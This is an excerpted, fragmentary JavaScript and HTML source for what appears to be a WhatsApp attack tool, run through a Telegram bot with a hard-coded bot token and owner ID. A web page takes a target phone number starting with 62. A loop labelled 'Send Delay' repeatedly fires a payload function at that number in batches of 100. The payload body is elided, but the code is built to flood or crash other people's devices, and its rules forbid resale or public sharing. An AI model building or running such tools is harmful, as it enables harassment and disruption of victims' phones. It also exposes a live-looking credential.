...
// ==================== CONFIGURATION ==================== //
const BOT_TOKEN = "8624525573:AAGoyKCBsW3TzqX16rZZBk3OmYulfm5iJb4";
const OWNER_ID = "8574670651";
...
⚠️ *Rules (jangan sok bandel):*
• Dilarang sebar ke publik  
• Dilarang free-in sembarangan  
• Dilarang jual ulang  

_Use it wisely. Sekali ketahuan ngaco, ya wassalam._`,
    { parse_mode: "Markdown" }
  ).then(() => {
...
bot.command("addacces", (ctx) => {
  ...
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 1234567891", { parse_mode: "Markdown" });
...
bot.command("delacces", (ctx) => {
  ...
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 1234567891", { parse_mode: "Markdown" });
...
bot.command("addowner", (ctx) => {
  ...
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 1234567891", { parse_mode: "Markdown" });
...
bot.command("delowner", (ctx) => {
  ...
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 1234567891", { parse_mode: "Markdown" });
...
// ==================== FUNCTIONS 
async function MakluGwEvve(sock, target) {
  const Ridzz = {
...
async function androdelay(durationHours, target) {
  ...
  const sendNext = async () => {
    ...
    try {
      if (count < 100) {
        await Promise.all([
          MakluGwEvve(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Send Delay 🦠
└────────────────────────┘
  `));
        count++;
        ...
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Kaizyy 🍂 505 ).`));
          count = 0;
          batch++;
...
<head>
  ...
  border-radius:14px;
  object-fit:cover;
  box-shadow:0 0 16px var(--primary),0 0 30px rgba(0,229,255,.3);
}
...
<body>
  ...
  <source src="https://gangalink.vercel.app/i/4hrumhvf.mp4" type="video/mp4">
</video>
    ...
    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/zyyneweraa" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
      </div>
      <div class="footer-button">
  ...
  <script>
    ...
    executeBtn.addEventListener('click', () => {
      ...
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62.");
        return;
      }
